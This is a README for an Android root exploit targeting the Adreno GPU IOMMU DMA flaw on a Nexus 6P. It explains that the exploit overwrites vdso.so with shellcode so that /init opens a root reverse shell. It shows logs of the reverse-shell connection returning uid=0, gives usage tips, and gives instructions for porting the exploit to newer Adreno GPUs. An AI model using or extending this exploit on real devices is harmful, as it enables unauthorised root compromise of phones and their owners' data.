# ADRENO GPU IOMMU DMA EXPLOIT

Tested under Nexus 6p (google/angler/angler:6.0.1/MMB29M/2431559:user/release-keys)

# About the bug

Discussed in 2016 via [Blackhat EU](https://www.blackhat.com/docs/eu-16/materials/eu-16-Taft-GPU-Security-Exposed.pdf)

# About the exploit

With iommu dma writes, vdso.so is overwritten with shellcode.

So after /init executes __kernel_clock_gettime, the shellcode will get executed.

/init process then connect back with a root shell.

# Logs
```
Reverse shell target: 127.0.0.1:4919
shellcode patch done
hook patch done
Waiting for reverse connect shell...
TERMINAL>>>
id
uid=0(root) gid=0(root) groups=0(root) context=u:r:init:s0
```

# Tips

Delete /data/local/tmp/x if any before the exploit.

If the waiting time is too long, try open "Time and Date" options inside the settings of your phone.

# Porting to other devices

Check the verison of adreno, currently it is built for 4xx.

For 5xx and above:
 - use cp_type7_packet instead of cp_type3_packet
 - use IOCTL_KGSL_GPU_COMMAND instead of IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS